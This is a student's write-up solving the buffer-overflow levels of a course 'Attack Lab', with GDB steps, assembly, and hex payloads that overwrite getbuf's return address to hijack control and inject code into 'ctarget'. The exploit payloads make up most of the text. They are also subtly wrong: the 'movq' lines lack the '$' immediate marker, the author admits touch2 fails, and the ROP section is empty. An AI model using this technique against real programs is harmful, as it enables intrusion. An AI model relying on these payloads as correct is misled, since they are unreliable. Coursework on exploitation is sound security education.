# Solution of Attack Lab
## Code Injection Attacks
### Level 1
Use buffer overflow to rewrite the return address.    
```
disas touch1
```
We get the address of touch1: 0x4017c0. Remember that x86 write data in little-end order, that means the address is c0 17 40. And in x86-64, the address is referred by 64 bits (8 bytes). That is, we should write ```c0 17 40 00 00 00 00 00``` into the 'ret' address of 'getbuf'. In 'getbuf', 0x28 (40) bytes are allocated, so we fill the space with 40 zeros and end with 'touch1' enter address:    
```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```
Above is the machine code represented input, use 'hex2raw' to convert to string input:      
```./hex2raw -i touch1.txt | ./ctarget -q```

### Level 2
In level 2, we not only need to enter touch2, but also need to set the input 'val' to intended value, which is the same as our cookie '0x59b997fa'. Thus, the operation we need to do is:    
```
movq 0x59b997fa, %rdi
pushq 0x4017ec
ret
```
Convert to machine code:
```
gcc -c touch2_insert.s
objdump -d inject.o
```
We get:
```
48 8b 3c 25 fa 97 b9 59
ff 34 25 ec 17 40 00
c3
```
To insert these codes, we store them in the array in 'getbuf', and rewrite the 'ret' address so that getbuf can return to our codes. Use GDB to get the address of %rsp, where the array starts.     
```
break getbuf
run -q
disas
stepi
p $rsp
```
We get the address of rsp is: %0x5561dc78. Then we form the input like level1:
```
48 8b 3c 25 fa 97 b9 59 ff 34 
25 ec 17 40 00 c3 00 00 00 00 
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```
```./hex2raw -i touch2.txt | ./ctarget -q```
It's likely that gcc version is slighly different, so I failed to pass touch2 even I called it successfully.

### Level 3
In this level we need to input "59b997fa" as a string, set %rdi to its address so the string can be convey to touch3 (0x).    
```
movq address, %rdi
pushq 0x4018fa
ret
```
During the process, the function call order is: test->getbuf->touch3. Because in touch3->hexmatch, "char \*s = cbuf + random() % 100;", which means the stack frame of previous function could be polluted. So we should put the cookie string in a safer place, such as in 'test'. So the solution is obvious: In getbuf, we write operations in the array, rewrite the 'ret' address to the array head, and write "59b997fa" after the 'ret' address, which is part of the frame of 'test'.    
Frist break at the start of getbuf, we print %rsp = 0x5561dca0. So the %rsp of 'test' starts from 0x5561dca8.
Insert code:    
```
movq 0x5561dca8, %rdi
pushq 0x4018fa
ret
```
Disassemble it:
```
0000000000000000 <.text>:
   0:	48 8b 3c 25 a8 dc 61 	mov    0x5561dca8,%rdi
   7:	55 
   8:	ff 34 25 fa 18 40 00 	pushq  0x4018fa
   f:	c3                   	retq 
```
Then find the machine code of '59b997fa' using ```man ascii```:    
35 39 62 39 39 37 66 61 00    
Form the input:
```
48 8b 3c 25 a8 dc 61 55 ff 34 
25 fa 18 40 00 c3 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 35 39 
62 39 39 37 66 61 00 
```
```./hex2raw -i touch3.txt | ./ctarget -q```

## Return-Oriented Programming
### ROP level 2

